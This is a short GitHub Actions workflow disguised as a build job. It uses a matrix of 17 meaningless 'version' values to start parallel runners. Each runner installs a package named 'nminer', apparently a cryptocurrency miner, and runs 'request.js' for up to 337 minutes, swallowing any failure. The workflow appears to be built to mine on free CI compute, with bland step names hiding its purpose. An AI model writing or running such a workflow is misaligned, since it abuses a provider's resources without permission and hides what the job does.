name: request
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4202 }
          - { version: 7714 }
          - { version: 923 }
          - { version: 3154 }
          - { version: 4095 }
          - { version: 7351 }
          - { version: 7026 }
          - { version: 7766 }
          - { version: 2008 }
          - { version: 2241 }
          - { version: 1687 }
          - { version: 8908 }
          - { version: 7494 }
          - { version: 4322 }
          - { version: 4923 }
          - { version: 6962 }
          - { version: 9897 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: sate
        run: |
          npm install nminer@latest
          timeout 337m node request.js || echo "request executed"